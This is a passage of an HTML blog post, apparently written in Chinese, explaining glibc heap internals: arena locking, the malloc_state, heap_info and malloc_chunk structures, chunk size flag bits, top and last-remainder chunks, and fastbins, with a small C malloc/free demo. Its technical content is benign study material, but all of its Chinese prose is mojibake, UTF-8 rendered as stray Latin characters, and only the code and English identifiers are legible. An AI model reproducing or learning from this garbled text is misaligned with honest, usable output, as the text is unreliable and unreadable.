mallocå¾ªç¯éå†æ‰€æœ‰å¯ç”¨çš„ç«æŠ€åœºï¼Œåœ¨éå†çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šå°è¯•é”è¯¥ç«æŠ€åœºã€‚å¦‚æœæˆåŠŸé”ï¼ˆè¯¥ç«æŠ€åœºå½“å‰å¯¹åº”çš„çº¿ç¨‹å¹¶æœªä½¿ç”¨å †å†…å­˜åˆ™è¡¨ç¤ºå¯é”ï¼‰ï¼Œé‚£ä¹ˆè¯¥ç«æŠ€åœºå°±å¯ä»¥è¢«çº¿ç¨‹3æ‰€ä½¿ç”¨</li><li>è€Œå¦‚æœæ²¡èƒ½æ‰¾åˆ°å¯ç”¨çš„èˆå°ä¸Šï¼Œé‚£ä¹ˆå°±å°†çº¿ç¨‹3çš„mallocçš„æ“ä½œé˜»å¡ï¼Œç›´åˆ°æœ‰å¯ç”¨çš„èˆå°ä¸ºæ­¢</li><li>å½“çº¿ç¨‹3çš„mallocé˜»å¡è§£é™¤æ—¶ï¼Œglibc mallocå°±ä¼šå…ˆå°è¯•ä½¿ç”¨æœ€è¿‘è®¿é—®çš„ç«æŠ€åœºï¼ˆæ­¤æ—¶ä¸ºä¸»ç«æŠ€åœºï¼‰ã€‚å¦‚æœæ­¤æ—¶ä¸»ç«æŠ€åœºå¯ç”¨çš„è¯ï¼Œå°±ç›´æ¥ä½¿ç”¨ï¼Œå¦åˆ™å°±å°†çº¿ç¨‹3å†æ¬¡é˜»å¡ï¼Œç›´åˆ°ä¸»èˆå°ä¸Šå†æ¬¡å¯ç”¨ä¸ºæ­¢</li></ul></blockquote><h4 id="2-malloc-state"><a href="#2-malloc-state" class="headerlink" title="2.malloc_state"></a>2.<strong>malloc_state</strong></h4><ul><li>glibcçš„ä¸­arneaå°±æ˜¯ç”¨è¿™ä¸ªç»“æ„ä½“è¡¨ç¤ºçš„</li><li>å…¶ä¸­åŒ…å«å¾ˆå¤šçš„ä¿¡æ¯ï¼šå„ç§binsçš„ä¿¡æ¯ï¼Œtop chunkä»¥åŠæœ€åä¸€ä¸ªå‰©ä½™chunkç­‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>fastbinsYæ•°ç»„ï¼š</strong>å­˜å‚¨çš„æ˜¯è¯¥é¢†åŸŸç®¡ç†çš„fastbins</li><li><strong>binsæ•°ç»„ï¼š</strong>å­˜å‚¨çš„æ˜¯è¯¥é¢†åŸŸç®¡ç†çš„smallbinsï¼Œunsortedbinï¼Œlargebin</li><li><strong>binmapå˜é‡ï¼š</strong>ç³»ç»ŸæŸ¥çœ‹æœ‰å“ªäº›åƒåœ¾ç®±é“¾ä¸­æœ‰å—æ—¶ï¼Œä¸å¯èƒ½å»fastbinsYå’Œç®±æ•°ç»„ä¸€ä¸ªä¸€ä¸ªçš„éå†é€šè¿‡binmapå˜é‡ï¼Œé‡‡ç”¨äºŒè¿›åˆ¶å­˜å‚¨ï¼Œå°†äºŒè¿›åˆ¶ä½ä¸æ•°ç»„çš„ç´¢å¼•ç›¸å¯¹ï¼Œç³»ç»ŸæŸ¥æ‰¾ç®±é“¾æ—¶å¯ä»¥ã€‚é€šè¿‡æŒ‰ä½ä¸æ¥æŸ¥è¯¢ï¼Œè¿™æ ·æ›´é«˜æ•ˆã€‚è™½ç„¶unsigned intçš„äºŒè¿›åˆ¶ä½æ¯”æ•°ç»„æ€»å…ƒç´ å°‘ï¼Œä½†æ˜¯ç³»ç»Ÿä¸ä¼šæœ‰é‚£ä¹ˆå¤šçš„biné“¾ï¼Œä¸éœ€è¦è€ƒè™‘è¿™ä¸ªé—®é¢˜</li></ul></blockquote><h4 id="3-heap-info"><a href="#3-heap-info" class="headerlink" title="3.heap_info"></a>3.<strong>heap_info</strong></h4><ul><li>æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åŒ…å«å¤šä¸ªå †æ®µï¼Œè¿™äº›å †æ®µåŒå±äºä¸€ä¸ªèˆå°æ¥ç®¡ç†ã€‚æ¯ä¸ªå †æ®µçš„ä¿¡æ¯å°±æ˜¯ç”¨è¿™ä¸ªç»“æ„ä½“æ¥è¡¨ç¤ºçš„</li><li><strong>æ³¨æ„ï¼š</strong>è¿™ä¸ªä¸æ˜¯å­˜å‚¨å †å—çš„æ•°æ®ï¼Œè€Œæ˜¯æ¥è§£é‡Šè¯´æ˜è¿™ä¸ªå †æ®µçš„</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr;            <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span>  <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>;              <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size;     <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                             PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>ar_ptrï¼š</strong>æ­¤å †æ®µå½’å±äºå“ªä¸€ä¸ªarneaç®¡ç†</li><li><strong>prevï¼š</strong>å‰ä¸€ä¸ªå †æ®µ</li></ul></blockquote><h4 id="4-malloc-chunk"><a href="#4-malloc-chunk" class="headerlink" title="4.malloc_chunk"></a>4.malloc_chunk</h4><ul><li>ä¸€ä¸ªå †å—è¢«åˆ†ä¸ºå¤šä¸ªå—ï¼Œè¿™äº›å—å°±æ˜¯ç”¨è¿™äº›ç»“æ„ä½“è¡¨ç¤ºçš„ï¼Œè¿™ä¸ªæ‰æ˜¯æˆ‘ä»¬åœ¨glibcçš„æ­£çœŸå­˜å‚¨å †æ•°æ®ä¿¡æ¯çš„ç»“æ„ä½“</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).*/</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead.*/</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>   <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><ul><li><p>æ¯ä¸ªæˆå‘˜éƒ½æ˜¯8å­—èŠ‚ï¼ˆ64ä½ç³»ç»Ÿä¸­ï¼‰ï¼Œ4å­—èŠ‚ï¼ˆ32ä½ç³»ç»Ÿä¸­ï¼‰</p></li><li><p><strong>mchunk_prev_sizeï¼š</strong>åªæœ‰å½“è¯¥chunkçš„ç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€chunkæ˜¯ç©ºé—²çš„è¯ï¼Œè¯¥å­—æ®µåœ¨æœ¬chunkä¸­æ‰æœ‰ç”¨ï¼Œç”¨æ¥è®°å½•å‰ä¸€ä¸ªchunk çš„å¤§å° (åŒ…æ‹¬chunkå¤´)ã€‚å¦åˆ™ï¼Œè¯¥å­—æ®µä¸º0æ˜¯æ²¡æœ‰ç”¨çš„ï¼›ä½†æ˜¯å½“å‰ä¸€ä¸ªchunkç”³è¯·çš„å¤§å°å¤§äºå‰ä¸€ä¸ªchunkçš„å¤§å°æ—¶ï¼Œé‚£ä¹ˆè¯¥å­—æ®µå¯ä»¥ç”¨æ¥ç»™å‰ä¸€ä¸ªchunkä½¿ç”¨ï¼ˆè¿™å°±æ˜¯chunkçš„ç©ºé—´å¤ç”¨ï¼Œåé¢æ–‡ç« ä»‹ç»ï¼‰</p></li><li><strong>mchunk_sizeï¼š</strong>å½“å‰chunkçš„å¤§å°ï¼Œchunkå¤§å°éƒ½æ˜¯8å­—èŠ‚å¯¹é½</li></ul></blockquote><p>è¿™é‡Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹gdbè°ƒè¯•çš„ç•Œé¢</p><p>æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *H;</span><br><span class="line">    H = <span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(H,<span class="string">"aaaaaaaaaaaaaaaa"</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">free</span>(H);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">gcc -o a.out a.c#<span class="number">64</span>ä½</span><br><span class="line">gcc -m32 -o b.out b.c#<span class="number">32</span>ä½</span><br></pre></td></tr></table></figure><p>64ä½</p><p><img src="/2020/12/15/%E5%A0%86/image-20201212004040135.png" alt="image-20201212004040135"></p><p>32ä½</p><p><img src="/2020/12/15/%E5%A0%86/image-20201212004126045.png" alt="image-20201212004126045"></p><blockquote><p><strong>å½“å‰chunkå¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼š</strong></p><ul><li>fdï¼šä»fdå­—æ®µå¼€å§‹çš„æ˜¯ç”¨æˆ·çš„æ•°æ®</li></ul><p><strong>å½“å‰chunkå¤„äºç©ºé—²æ—¶ï¼š</strong></p><p>å› ä¸ºchunkå¤„äºç©ºé—²æ—¶ï¼Œä¼šè¢«æ”¾åˆ°biné“¾ä¸­ï¼Œæ‰€ä»¥fdå’Œbkç”¨äºæŒ‡å‘è‡ªå·±æ‰€åœ¨biné“¾ä¸­å‰åçš„ç©ºé—²chunk</p><ul><li>fdï¼šæŒ‡å‘å‰ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunkçš„æŒ‡é’ˆï¼ˆå¤´æŒ‡é’ˆï¼‰</li><li>bkï¼šæŒ‡å‘åä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunkçš„æŒ‡é’ˆ</li><li>é€šè¿‡fdå’Œbkå¯ä»¥å°†ç©ºé—²çš„chunkå—åŠ å…¥åˆ°ç©ºé—²çš„chunkå—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†</li></ul><p><strong>fd_nextsizeã€bk_nextsize</strong></p><p>ä¹Ÿæ˜¯åªæœ‰chunkç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„chunkï¼ˆlarge chunkï¼‰</p><ul><li>fd_nextsizeï¼šæŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«binçš„å¤´æŒ‡é’ˆ</li><li>bk_nextsizeï¼šæŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</li></ul><p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†</p></blockquote><h5 id="malloc-chunkçš„å†…å­˜åˆ†é…å¤§å°"><a href="#malloc-chunkçš„å†…å­˜åˆ†é…å¤§å°" class="headerlink" title="malloc_chunkçš„å†…å­˜åˆ†é…å¤§å°"></a>malloc_chunkçš„å†…å­˜åˆ†é…å¤§å°</h5><p><strong>æœ€å°çš„ç©ºé—´ï¼š</strong>mchunk_prev_sizeå­—æ®µ + mchunk_sizeå­—æ®µ + fdå­—æ®µ + bkå­—æ®µ æ‰€éœ€è¦çš„ç©ºé—´ã€‚æ‰€ä»¥64ä½ç³»ç»Ÿæœ€ä½éœ€è¦ 4 * SIZE_SZ = 32å­—èŠ‚ï¼›32ä½ç³»ç»Ÿæ˜¯16å­—èŠ‚</p><p><strong>å®é™…ç©ºé—´ï¼š</strong>mallocå¤§å° + chunkå¯¹é½è§„åˆ™ + mchunk_prev_sizeå­—æ®µ + mchunk_sizeå­—æ®µ + ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeæˆå‘˜ç©ºé—´</p><p>chunkçš„æ•°æ®ç»“æ„å¤§å°çš„å›¾ï¼ˆ64ä½ç³»ç»Ÿï¼‰</p><p><img src="/2020/12/15/%E5%A0%86/20201106174934849.jpg" alt="img"></p><h5 id="mchunk-sizeçš„æ ‡è®°ä½çš„å¤ç”¨"><a href="#mchunk-sizeçš„æ ‡è®°ä½çš„å¤ç”¨" class="headerlink" title="mchunk_sizeçš„æ ‡è®°ä½çš„å¤ç”¨"></a>mchunk_sizeçš„æ ‡è®°ä½çš„å¤ç”¨</h5><p>mchunk_sizeåœ¨64ä½ç³»ç»Ÿä¸‹æ˜¯8ä¸ªå­—èŠ‚ï¼Œå­—æ®µçš„æœ€åä¸‰ä¸ªbitä½ï¼Œå¤ç”¨ç”¨ä½œäº†ï¼ˆAMPï¼‰çš„æ ‡è®°ä½ç½®ã€‚åä¸‰ä½bitä½çš„å¤ç”¨ï¼Œä¸ä¼šå½±å“sizeçš„æ•°æ®å¤§å°</p><ul><li>Aï¼šA=0 ä¸ºä¸»åˆ†åŒºåˆ†é…ï¼ŒA=1 ä¸ºéä¸»åˆ†åŒºåˆ†é…ï¼Œå‚è§åé¢</li><li>Mï¼šM=1è¡¨ç¤ºä½¿ç”¨mmapæ˜ å°„åŒºåŸŸï¼ŒM=0ä¸ºä½¿ç”¨heapåŒºåŸŸ</li><li>Pï¼šP=0 è¡¨ç¤ºpre_chunkç©ºé—²ï¼Œmchunk_prev_sizeæ‰æœ‰æ•ˆ</li></ul><h3 id="0x04-chunkçš„åˆ†ç±»"><a href="#0x04-chunkçš„åˆ†ç±»" class="headerlink" title="0x04 chunkçš„åˆ†ç±»"></a>0x04 chunkçš„åˆ†ç±»</h3><h4 id="1-allocated-chunk"><a href="#1-allocated-chunk" class="headerlink" title="1.allocated chunk"></a>1.allocated chunk</h4><p>å½“å‰chunkæ˜¯è¢«åº”ç”¨å±‚ç”¨æˆ·æ‰€ä½¿ç”¨çš„</p><h4 id="2-free-chunk"><a href="#2-free-chunk" class="headerlink" title="2.free chunk"></a>2.free chunk</h4><p>å½“å‰chunkæ˜¯ç©ºé—²çš„ï¼Œæ²¡æœ‰è¢«åº”ç”¨å±‚ç”¨æˆ·æ‰€ä½¿ç”¨</p><h4 id="3-top-chunk"><a href="#3-top-chunk" class="headerlink" title="3.top chunk"></a>3.<strong>top chunk</strong></h4><ul><li><strong>æ¦‚å¿µï¼š</strong>å½“ä¸€ä¸ªchunkå¤„äºä¸€ä¸ªarenaçš„æœ€é¡¶éƒ¨(å³æœ€é«˜å†…å­˜åœ°å€å¤„)çš„æ—¶å€™ï¼Œå°±ç§°ä¹‹ä¸ºtop chunk</li><li><strong>ä½œç”¨ï¼š</strong>è¯¥chunkå¹¶<strong>ä¸å±äºä»»ä½•</strong>binï¼Œè€Œæ˜¯åœ¨ç³»ç»Ÿå½“å‰çš„æ‰€æœ‰free chunk(æ— è®ºé‚£ç§bin)éƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°çš„æ—¶å€™ï¼Œå°†æ­¤chunkå½“åšä¸€ä¸ªåº”æ€¥æ¶ˆé˜²å‘˜ï¼Œåˆ†é…ç»™ç”¨æˆ·ä½¿ç”¨</li><li><strong>åˆ†é…çš„è§„åˆ™ï¼š</strong>å¦‚æœtop chunkçš„å¤§å°æ¯”ç”¨æˆ·è¯·æ±‚çš„å¤§å°è¦å¤§çš„è¯ï¼Œå°±å°†è¯¥top chunkåˆ†ä½œä¸¤éƒ¨åˆ†ï¼š1ï¼‰ç”¨æˆ·è¯·æ±‚çš„chunkï¼›2ï¼‰å‰©ä½™çš„éƒ¨åˆ†æˆä¸ºæ–°çš„top chunkã€‚å¦åˆ™ï¼Œå°±éœ€è¦æ‰©å±•heapæˆ–åˆ†é…æ–°çš„heapäº†â€”â€”åœ¨main arenaä¸­é€šè¿‡sbrkæ‰©å±•heapï¼Œè€Œåœ¨thread arenaä¸­é€šè¿‡mmapåˆ†é…æ–°çš„heap</li></ul><h4 id="4-last-remainder-chunk"><a href="#4-last-remainder-chunk" class="headerlink" title="4.last remainder chunk"></a>4.last remainder chunk</h4><ul><li><strong>å®ƒæ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼š</strong>å½“ç”¨æˆ·è¯·æ±‚çš„æ˜¯ä¸€ä¸ªsmall chunkï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢«small binã€unsorted binæ»¡è¶³çš„æ—¶å€™ï¼Œå°±é€šè¿‡binmapséå†binæŸ¥æ‰¾æœ€åˆé€‚çš„chunkï¼Œå¦‚æœè¯¥chunkæœ‰å‰©ä½™éƒ¨åˆ†çš„è¯ï¼Œå°±å°†è¯¥å‰©ä½™éƒ¨åˆ†å˜æˆä¸€ä¸ªæ–°çš„chunkåŠ å…¥åˆ°unsorted binä¸­ï¼Œå¦å¤–ï¼Œ<strong>å†å°†è¯¥æ–°çš„chunkå˜æˆæ–°çš„last remainder chunk</strong></li><li><strong>å®ƒçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼š</strong>æ­¤ç±»å‹çš„chunkç”¨äºæé«˜è¿ç»­malloc(small chunk)çš„æ•ˆç‡ï¼Œä¸»è¦æ˜¯æé«˜å†…å­˜åˆ†é…çš„å±€éƒ¨æ€§ã€‚é‚£ä¹ˆå…·ä½“æ˜¯æ€ä¹ˆæé«˜å±€éƒ¨æ€§çš„å‘¢ï¼Ÿä¸¾ä¾‹è¯´æ˜ã€‚å½“ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªsmall chunkï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢«small binæ»¡è¶³ï¼Œé‚£ä¹ˆå°±è½¬è€Œäº¤ç”±unsorted binå¤„ç†ã€‚åŒæ—¶ï¼Œå‡è®¾å½“å‰unsorted binä¸­åªæœ‰ä¸€ä¸ªchunkçš„è¯â€”â€”å°±æ˜¯last remainder chunkï¼Œé‚£ä¹ˆå°±å°†è¯¥chunkåˆ†æˆä¸¤éƒ¨åˆ†ï¼šå‰è€…åˆ†é…ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†æ”¾åˆ°unsorted binä¸­ï¼Œå¹¶æˆä¸ºæ–°çš„last remainder chunkã€‚è¿™æ ·å°±ä¿è¯äº†è¿ç»­malloc(small chunk)ä¸­ï¼Œå„ä¸ªsmall chunkåœ¨å†…å­˜åˆ†å¸ƒä¸­æ˜¯ç›¸é‚»çš„ï¼Œå³æé«˜äº†å†…å­˜åˆ†é…çš„å±€éƒ¨æ€§</li></ul><h3 id="0x05-binsåˆ†ç±»"><a href="#0x05-binsåˆ†ç±»" class="headerlink" title="0x05 binsåˆ†ç±»"></a>0x05 binsåˆ†ç±»</h3><blockquote><ul><li>binæ˜¯ä¸€ä¸ªç”±struct chunkç»“æ„ä½“ç»„æˆçš„é“¾è¡¨</li><li>å‰é¢ä»‹ç»è¿‡ï¼Œä¸åŒçš„chunkæ ¹æ®ç‰¹ç‚¹ä¸åŒåˆ†ä¸ºä¸åŒçš„chunkï¼Œä¸ºäº†å°†è¿™äº›chunkè¿›è¡Œåˆ†ç±»çš„ç®¡ç†ï¼Œglibcé‡‡ç”¨äº†biné“¾è¿™ç§æ–¹å¼ç®¡ç†ä¸åŒçš„chunk</li><li>ä¸åŒçš„biné“¾æ˜¯ç”±arenaç®¡ç†çš„</li><li>biné“¾ä¸­çš„chunkå‡ä¸ºfree chunk</li></ul></blockquote><h4 id="1-binçš„malloc-state"><a href="#1-binçš„malloc-state" class="headerlink" title="1.binçš„malloc_state"></a>1.binçš„malloc_state</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>fastbinYæ•°ç»„ï¼š</strong>å¤§å°ä¸º10ã€‚è®°å½•çš„æ˜¯fast biné“¾</li><li><strong>binsæ•°ç»„ï¼š</strong>å¤§å°ä¸º129ã€‚è®°å½•çš„æ˜¯unsorted binï¼ˆ1ï¼‰ã€small binï¼ˆ2~63ï¼‰ã€large biné“¾ï¼ˆ64~126ï¼‰</li></ul><h4 id="2-fastbin"><a href="#2-fastbin" class="headerlink" title="2.fastbin"></a>2.fastbin</h4><p><strong>æ¦‚å¿µï¼š</strong>chunkçš„å¤§å°åœ¨32å­—èŠ‚åˆ°128å­—èŠ‚ï¼ˆ0x20~0x80ï¼‰çš„chunkç§°ä¸ºâ€œfast chunkï¼ˆå¤§å°ä¸æ˜¯mallocæ—¶çš„å¤§å°ï¼Œè€Œæ˜¯åœ¨å†…å­˜ä¸­struct malloc_chunkçš„å¤§å°ï¼ŒåŒ…å«å‰2ä¸ªæˆå‘˜ï¼‰</p><ul><li>fast biné“¾è¡¨çš„ä¸ªæ•°ä¸º10ä¸ª</li><li><strong>ä¸ä¼šå¯¹free chunkè¿›è¡Œåˆå¹¶ï¼š</strong>é‰´äºè®¾è®¡fast binçš„åˆè¡·å°±æ˜¯è¿›è¡Œå¿«é€Ÿçš„å°å†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œå› æ­¤ç³»ç»Ÿå°†å±äº<strong>fast binçš„chunkçš„PREV_INUSEä½æ€»æ˜¯è®¾ç½®ä¸º1</strong>ï¼Œè¿™æ ·å³ä½¿å½“fast binä¸­æœ‰æŸä¸ªchunkåŒä¸€ä¸ªfree 